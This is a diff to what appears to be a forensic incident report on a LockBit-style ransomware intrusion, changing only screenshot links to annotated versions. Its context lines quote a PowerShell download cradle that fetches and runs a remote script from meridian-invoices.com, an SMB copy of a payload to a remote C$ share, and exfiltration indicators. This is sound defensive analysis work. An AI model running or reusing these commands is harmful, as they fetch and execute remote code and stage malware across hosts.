@@ -42,7 +42,7 @@ MFT Modified:  2026-05-23 16:27:59.260092100 CDT
 Accessed:      2026-05-23 16:27:59.259975300 CDT
 ```
 
-![Autopsy view of Invoice_March2024.docm](screenshots/01-autopsy-invoice-docm.png)
+![Autopsy view of Invoice_March2024.docm](screenshots/01-autopsy-invoice-docm-annotated.png)
 
 Autopsy also identified a Prefetch artifact for Microsoft Word:
 
@@ -60,7 +60,7 @@ The malicious document led to a PowerShell download cradle:
 IEX(New-Object Net.WebClient).DownloadString('http://meridian-invoices.com/stage1.ps1')
 ```
 
-![Autopsy view of PowerShell staging content](screenshots/03-autopsy-powershell-stage1.png)
+![Autopsy view of PowerShell staging content](screenshots/03-autopsy-powershell-stage1-annotated.png)
 
 Additional Prefetch artifacts support execution of multiple programs associated with the attack sequence:
 
@@ -77,13 +77,13 @@ WINWORD.EXE-2A1C9F83.pf
 
 These artifacts align with document execution, script execution, command execution, lateral movement, anti-recovery activity, staged payload execution, and ransomware execution.
 
-![Autopsy Prefetch execution artifacts](screenshots/02-autopsy-prefetch-execution-artifacts.png)
+![Autopsy Prefetch execution artifacts](screenshots/02-autopsy-prefetch-execution-artifacts-annotated.png)
 
 ### Command and Control
 
 Network evidence showed `192.168.1.45` resolving `meridian-invoices.com` and communicating with `185.220.101.47`.
 
-![Wireshark DNS and document download traffic](screenshots/05-wireshark-dns-docm-download.png)
+![Wireshark DNS and document download traffic](screenshots/05-wireshark-dns-docm-download-annotated.png)
 
 The malware configuration also identified the same C2 address:
 
@@ -100,7 +100,7 @@ The malware configuration also identified the same C2 address:
 }
 ```
 
-![Autopsy view of lb_config.json](screenshots/04-autopsy-lockbit-config.png)
+![Autopsy view of lb_config.json](screenshots/04-autopsy-lockbit-config-annotated.png)
 
 ### Defense Evasion and Anti-Recovery
 
@@ -130,7 +130,7 @@ copy C:\Windows\Temp\svchost_tmp.exe \\192.168.1.88\C$\Windows\Temp\
 
 This activity indicates use of valid credentials and administrative SMB access for lateral movement or remote staging.
 
-![Wireshark C2 and SMB traffic](screenshots/06-wireshark-c2-and-smb.png)
+![Wireshark C2 and SMB traffic](screenshots/06-wireshark-c2-and-smb-annotated.png)
 
 ### Persistence and Privilege Activity
 
@@ -162,7 +162,7 @@ https://mega.nz/upload
 
 Network traffic included DNS resolution for `g.api.mega.co.nz` and outbound HTTPS traffic to `185.235.81.22`, supporting possible exfiltration activity.
 
-![Wireshark exfiltration and LockBit DNS indicators](screenshots/07-wireshark-exfil-lockbit-dns.png)
+![Wireshark exfiltration and LockBit DNS indicators](screenshots/07-wireshark-exfil-lockbit-dns-annotated.png)
 
 ### Ransomware Impact
 
